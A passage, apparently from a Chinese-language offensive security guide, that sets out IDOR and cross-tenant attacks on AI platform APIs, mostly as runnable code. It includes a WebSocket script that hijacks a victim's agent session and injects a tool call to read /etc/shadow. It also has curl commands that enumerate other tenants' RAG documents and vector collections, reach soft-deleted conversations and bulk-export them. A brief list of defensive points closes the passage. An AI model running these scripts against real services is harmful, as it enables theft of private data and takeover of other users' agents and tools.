        r = requests.get(f"{BASE}/{endpoint}/{oid}",
                         headers={"Authorization": KEY}, verify=False, timeout=5)
        if r.status_code == 200:
            print(f"[+] {endpoint}/{oid}: {r.text[:150]}")
```

**步骤 3 - Agent Session 劫持(WebSocket)**:
```python
#!/usr/bin/env python3
# 文件名: agent_session_hijack.py
# AI Agent 会话劫持 - 注入工具调用到受害者会话
import websocket, json, urllib3
urllib3.disable_warnings()

# 从步骤 2 获取受害者的 agent_session_id
VICTIM_SESSION = "sess_victim_7813"

# 连接受害者的 agent WebSocket 会话(若 session_id 未绑定认证主体)
ws = websocket.create_connection(
    f"wss://api.target.com/v1/agents/{VICTIM_SESSION}/stream",
    header=["Authorization: Bearer sk-ATTACKER_KEY"]
)

# 注入工具调用到受害者的运行中会话
# 受害者的 agent 可能已配置了高危工具(文件读取/命令执行)
inject_msg = {
    "type": "tool_call",
    "tool": "read_file",
    "arguments": {"path": "/etc/shadow"},  # 读取系统密码文件
    "session_id": VICTIM_SESSION
}
ws.send(json.dumps(inject_msg))

# 接收受害者的工具执行结果(可能泄露敏感数据)
while True:
    result = ws.recv()
    data = json.loads(result)
    if data.get("type") == "tool_result":
        print(f"[+] 工具执行结果(受害者数据): {data.get('content','')[:500]}")
        break
ws.close()
```

**步骤 4 - 预测端点越权(模型训练数据泄露)**:
```bash
# 测试预测/推理端点的对象级鉴权
# RAG 文档枚举(泄露嵌入的源文档: 合同/内部 wiki)
curl -sk "https://api.target.com/v1/documents/doc_10042" \
  -H "Authorization: Bearer sk-ATTACKER_KEY"
# 若返回 200 + 其他租户的文档内容 -> IDOR

# 向量数据库集合越权(跨租户向量读取)
curl -sk -X POST "https://api.target.com/v1/vector/collections/col_victim/query" \
  -H "Authorization: Bearer sk-ATTACKER_KEY" -H "Content-Type: application/json" \
  -d '{"query":"confidential","top_k":10}'
# 若返回其他租户的向量检索结果 -> 跨租户数据泄露
```

**步骤 5 - 检测绕过技巧**:
```bash
# 绕过 1: API key 不绑定租户 -> 任意 key 可访问任意对象
# 测试: 用 key A 创建对象, 用 key B 访问
KEY_A="sk-orgA..."
KEY_B="sk-orgB..."
# A 创建对话
CONV=$(curl -sk -X POST "https://api.target.com/v1/chat" \
  -H "Authorization: Bearer ${KEY_A}" -d '{"messages":[{"role":"user","content":"test"}]}' | jq -r '.conversation_id')
# B 尝试访问 A 的对话
curl -sk "https://api.target.com/v1/conversations/${CONV}" -H "Authorization: Bearer ${KEY_B}"
# 200 = 跨租户 IDOR

# 绕过 2: 软删除对象仍可访问(GDPR 数据泄露)
curl -sk "https://api.target.com/v1/conversations/${CONV}?include_deleted=true" -H "Authorization: Bearer ${KEY_B}"

# 绕过 3: 导出端点批量泄露
curl -sk "https://api.target.com/v1/conversations/export?ids=10042,10043,10044" \
  -H "Authorization: Bearer ${KEY_B}"
```

**防御要点**: AI API 必须将 API key 绑定到租户/用户;每个对象访问校验"该 key 是否拥有该对象";conversation_id/session_id 使用不可预测的 UUID v4;agent session WebSocket 需每消息鉴权;软删除对象不可通过参数恢复访问。
